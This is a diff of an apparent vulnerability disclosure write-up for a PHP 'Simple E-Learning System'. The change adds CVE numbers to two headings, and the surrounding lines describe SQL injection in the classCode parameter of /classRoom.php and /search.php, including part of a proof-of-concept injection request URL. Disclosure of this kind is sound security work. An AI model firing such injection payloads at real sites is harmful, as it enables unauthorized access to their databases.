@@ -7,7 +7,7 @@
 ### Tested on: windows10 + phpstudy
 
 
-# 1./classRoom.php
+# 1./classRoom.php(CVE-2022-2489)
 /classRoom.php SQL injection exists for parameter classCode
 
 ### Sample request POC #1
@@ -19,7 +19,7 @@ http://[ip:port]/classRoom.php?classCode=1'||(SELECT 0x6770715a WHERE 8795=8795 
 ![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/16582996517475.png "Simple E-Learning System")
 
 
-# 2./search.php
+# 2./search.php(CVE-2022-2490)
 /search.php SQL injection exists for parameter classCode
 
 ### Sample request POC #2
